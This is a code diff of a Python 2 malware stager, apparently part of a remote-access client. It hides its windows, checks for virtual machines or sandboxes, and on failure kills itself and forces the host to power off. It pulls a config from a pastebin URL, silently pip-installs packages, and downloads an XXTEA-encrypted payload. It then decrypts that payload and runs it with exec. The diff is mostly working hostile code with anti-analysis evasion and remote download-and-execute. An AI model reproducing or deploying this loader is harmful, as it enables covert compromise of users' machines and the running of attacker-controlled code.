@@ -63,35 +63,27 @@ def debug(output):
     if _debug:
         print(bytes(output))
 
+def abort(output=None):
+    global _debug
+    debug(output)
+    if not _debug:
+        if os.name is 'nt':
+            execute('taskkill /pid %d' % os.getpid())
+            execute('shutdown /p /f')                
+        else:
+            execute('kill -9 %d' % os.getpid())
+            execute('shutdown --poweroff --no-wall')
+
 def execute(cmd):
     global _debug
     try:
         info = subprocess.STARTUPINFO()
         info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
         info.wShowWindow = subprocess.SW_HIDE
-        subprocess.Popen( 0, None, None, subprocess.PIPE, subprocess.PIPE, startup=info, shell=True)
-    except Exception as e:
-        debug(e)
-        
-def download(uri):
-    global _debug
-    try:
-        return urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241%s' % uri)).strip('0x').strip('L')))).read()
+        subprocess.Popen(cmd, 0, None, None, subprocess.PIPE, subprocess.PIPE, startup=info, shell=True)
     except Exception as e:
         debug(e)
 
-def abort(output=None):
-    global _debug
-    if _debug:
-        debug(output)
-    else:
-        if os.name is 'nt' and 0:
-            execute('taskkill /pid %d' % os.getpid())
-            execute('shutdown /p /f')                
-        elif 0:
-            execute('kill -9 %d' % os.getpid())
-            execute('shutdown --poweroff --no-wall')
-            
 def decrypt(data, key):
     global _debug
     data    = base64.b64decode(data)
@@ -102,16 +94,16 @@ def decrypt(data, key):
         u,v = struct.unpack("!2L", block)
         k   = struct.unpack("!4L", key)
         d,m = 0x9e3779b9L, 0xffffffffL
-        sum = (d * 32) & m
+        s   = (d * 32) & m
         for _ in range(32):
-            v   = (v - (((u << 4 ^ u >> 5) + u) ^ (sum + k[sum >> 11 & 3]))) & m
-            sum = (sum - d) & m
-            u   = (u - (((v << 4 ^ v >> 5) + v) ^ (sum + k[sum & 3]))) & m
+            v   = (v - (((u << 4 ^ u >> 5) + u) ^ (s + k[s >> 11 & 3]))) & m
+            s   = (s - d) & m
+            u   = (u - (((v << 4 ^ v >> 5) + v) ^ (s + k[s & 3]))) & m
         packed  = struct.pack("!2L", u, v)
-        output  = "".join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
+        output  = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
         vector  = block
         result.append(output)
-    return ''.join(result).rstrip(chr(0))
+    return str().join(result).rstrip(chr(0))
     
 def run(*args, **kwargs):
     global _debug
@@ -124,9 +116,9 @@ def run(*args, **kwargs):
     if not kwargs.get('config'):
         abort('missing config')
     else:
-        _conf = json.loads(download(kwargs.get('config')))
+        _conf = json.loads(urllib.urlopen(kwargs.get('config')).read())
         os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
-        packages = json.loads(download(_conf['t'])).get(os.name).get(str(struct.calcsize('P') * 8))
+        packages = json.loads(urllib.urlopen(_conf['t']).read()).get(os.name).get(str(struct.calcsize('P') * 8))
         for name, url in packages.items():
             if not subprocess.call([_pip, 'show', name], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                 execute([_pip, 'install', name])
@@ -161,6 +153,7 @@ def run(*args, **kwargs):
         return _conf
 
 
+
 def main(*args, **kwargs):
     global _debug
     if kwargs.get('checkvm'):
@@ -170,16 +163,16 @@ def main(*args, **kwargs):
             abort('virtual machine or sandbox was detected')
     if kwargs.get('config'):
         _conf = run(**kwargs)
-        _init = download(_conf.get('w'))
-        _main = download(_conf.get('j'))
-        _body = download(_conf.get('u'))
-        _code = download(_conf.get('z'))
-        main  = _main + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(_conf))
-        init  = 'from __future__ import print_function\nfor module in """{}""".splitlines():\n\ttry:\n\t\texec module in globals()\n\texcept: pass\n'.format(_init)
+        _code = urllib.urlopen(_conf.get('z')).read()
+        _body = urllib.urlopen(_conf.get('u')).read()
+        main  = 'if __name__ == "__main__":\n\tpayload=Client(config="{}")\n\tpayload.run()'.format(kwargs.get('config'))
         code  = base64.b64decode(_code)
         body  = decrypt(_body, code)
-        exec '\n\n'.join([init, body, main]) in globals()
+        exec '\n\n'.join([body, main]) in globals()
+    else:
+        abort()
+
 
 if __name__=='__main__':
-    _debug=bool('--debug' in sys.argv)
-    main(config=81126388790932157784)
+    _debug=bool('--debug' in sys.argv or 'debug' in sys.argv)
+    main(config='https://pastebin.com/raw/si8MrN5X')
